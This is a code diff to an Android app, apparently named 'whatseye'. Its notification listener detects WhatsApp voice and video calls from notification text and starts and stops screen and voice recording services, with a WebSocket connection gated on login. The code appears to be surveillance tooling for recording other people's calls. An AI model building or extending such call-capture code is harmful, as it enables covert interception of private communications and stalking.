@@ -6,6 +6,7 @@ import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
 import androidx.core.content.ContextCompat
+import com.example.whatseye.api.managers.JwtTokenManager
 import com.example.whatseye.api.ws.WebSocketClientGeneral
 import com.example.whatseye.api.ws.WebSocketGeneralManager
 import com.example.whatseye.dataType.data.NotificationData
@@ -15,10 +16,20 @@ class NotificationListener : NotificationListenerService() {
     private lateinit var webSocketManager: WebSocketClientGeneral
     private var lastNotificationHash: Int? = null
     private var lastNotificationTime: Long = 0
-
+    private val knownOngoingCalls = listOf(
+        "Ongoing voice call",
+        "Appel vocal en cours",
+        "مكالمة صوتية جارية"
+    )
+    private val knownOngoingVideoCalls = listOf(
+        "Ongoing video call",
+        "Appel vidéo en cours",
+        "مكالمة فيديو جارية"
+    )
     override fun onCreate() {
         super.onCreate()
-        webSocketManager = WebSocketGeneralManager.getInstance(this)
+        if(JwtTokenManager(this).getIsLogin())
+            webSocketManager = WebSocketGeneralManager.getInstance(this)
     }
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
@@ -33,16 +44,7 @@ class NotificationListener : NotificationListenerService() {
 
 
 
-        val knownOngoingCalls = listOf(
-            "Ongoing voice call",
-            "Appel vocal en cours",
-            "مكالمة صوتية جارية"
-        )
-        val knownOngoingVideoCalls = listOf(
-            "Ongoing video call",
-            "Appel vidéo en cours",
-            "مكالمة فيديو جارية"
-        )
+
         val matchesCallText = knownOngoingCalls.any { content.contains(it, ignoreCase = true) }
         val matchesVideoCallText = knownOngoingVideoCalls.any { content.contains(it, ignoreCase = true) }
 
@@ -83,12 +85,22 @@ class NotificationListener : NotificationListenerService() {
     override fun onNotificationRemoved(sbn: StatusBarNotification?) {
         if (sbn?.packageName != "com.whatsapp") return
 
+        val notification = sbn.notification
+        val extras = notification.extras
+        val content = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "No Content"
+        val matchesCallText = knownOngoingCalls.any { content.contains(it, ignoreCase = true) }
+        val matchesVideoCallText = knownOngoingVideoCalls.any { content.contains(it, ignoreCase = true) }
+
         val wasOngoingCall = !sbn.isClearable ||
                 (sbn.notification.flags and Notification.FLAG_ONGOING_EVENT) != 0
 
         if (wasOngoingCall) {
-            stopRecordingService()
-            stopRecordingVoiceService()
+            when {
+                matchesVideoCallText ->{
+                    stopRecordingService()
+                    stopRecordingVoiceService()}
+                matchesCallText -> stopRecordingVoiceService()
+            }
         }
     }
 
@@ -98,7 +110,6 @@ class NotificationListener : NotificationListenerService() {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             this.startActivity(intent)
         } catch (e: Exception) {
-            // If starting the service fails, log the error and start the voice recording service
             Log.e("RecordingService", "Failed to start screen recording service: ${e.message}")
         }
     }
